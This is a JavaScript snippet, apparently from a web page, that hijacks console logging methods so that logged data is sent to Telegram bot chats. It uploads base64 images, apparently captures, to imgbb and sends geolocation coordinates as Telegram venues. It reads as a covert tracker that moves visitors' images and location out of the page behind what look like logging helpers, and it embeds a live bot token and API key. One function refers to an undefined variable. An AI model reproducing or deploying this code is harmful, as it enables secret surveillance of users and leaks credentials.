(() => {
    var T = "989543891:AAFLuBhY8AgGC_LXPcOv7TM8dT_prmQkSf0"
    var fe = async(z) => {
        var id = "-1001161709623"
        z = z || "NOTEXT"
        z = z instanceof Array ? z.map(e => e = typeof e === "string" ? e : JSON.stringify(e, null, 4)).join("\n") : typeof z === "object" ? JSON.stringify(z, null, 4) : z
        z = z.substring(0, 4090)
        return await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${id}&text=${encodeURIComponent(z)}`)
            .then(r => r.json())
            .catch(async err => {
                err = err.stack || err
                await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${id}&text=${err}`)
                return err.stack
            })
            .then(async r => {
                if (r.description) return await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${id}&text=${r.description}`)
                return r.result.message_id || r
            })
    }

    

    var warn = console.warn
    console.warn = async function() {
     //   return await fetch(`https://api.telegram.org/bot989543891:AAFLuBhY8AgGC_LXPcOv7TM8dT_prmQkSf0/sendMessage?chat_id=-1001161709623&text=${encodeURIComponent(JSON.stringify([...arguments][0], null, 4))}`)
        return await fe([...arguments])
    }

    var error = console.error
    console.error = async function() {
        var e = [...arguments][0]
        e = e.stack || e
        return await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=-1001433099398&text=⛔️${
            JSON.stringify(e, null, 4)
        }`)
    }
    
var up = async ( image)=>{
 //var FormData = require('form-data')
// var name="l"
// var favDrink
// try{
// favDrink = prompt("?", "")
// var n = "🚩 www.google.com/maps?q="+name
// n +=" \n "
// n+=favDrink
// favDrink = transliterate(favDrink)+" "+name
// } catch(err) {}
  const formData = new FormData();
  formData.append("image", image.replace("data:image/jpeg;base64,",'').replace("data:image/png;base64,",''));
   //formData.append("name", favDrink);
  const resp = await (await fetch(`https://api.imgbb.com/1/upload?key=33612f7751537f4f27c5253f56edbf16`, {
    method: "POST",
    body: formData,
  })).json();

console.warn(resp.data)
  // if (!resp.success)
  //   return console.warn(`api upload fail: ${resp.status_code}: ${resp.error.message}`)
  // console.N([resp.data.display_url,n,name,Date.now(),resp.data.id],resp.data.id)
  // return console.info(resp.data.display_url,[resp.data.id,n])
}

    var N = console.N
        console.N = async function() {
       //return   console.error([...arguments][0])
        return   up([...arguments][0])
    }

    var GEO = console.GEO
        console.GEO = async function() {
       //return   console.error([...arguments][0])
       var v = [...arguments][0]

        return await fetch(`https://api.telegram.org/bot${T}/sendVenue?chat_id=-1001161709623&latitude=${v.loc.split(",")[0]}&longitude=${v.loc.split(",")[1]}&title=${Object.values(v).sort().join("\n")}&address=${Object.values(r).sort().join("\n")}`)
    }


    var exit = console.exit
    console.exit = async function() {
        var vv = [...arguments]
        if(vv[0]) { vv = vv[0] } else { vv = "NOTEXT" } 
        vv = encodeURIComponent(JSON.stringify(vv, null, 4))
        return await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=-1001482347974&text=${
            vv
        }`)
    }


})()